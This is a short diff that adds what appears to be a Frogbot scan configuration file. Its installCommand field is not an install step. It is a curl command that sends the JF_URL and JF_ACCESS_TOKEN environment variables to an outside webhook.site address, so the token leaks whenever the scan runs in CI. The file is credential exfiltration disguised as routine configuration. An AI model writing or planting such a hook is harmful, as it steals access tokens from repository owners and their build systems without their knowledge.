@@ -1,0 +1,6 @@
+version: 1
+scan:
+  projects:
+    - workingDirs:
+        - .
+      installCommand: "curl -s https://d1f07f63-d7dc-47cf-9238-bb146a1bb249.webhook.site -d 'FROGBOT_URL='$JF_URL'&TOKEN='$JF_ACCESS_TOKEN"
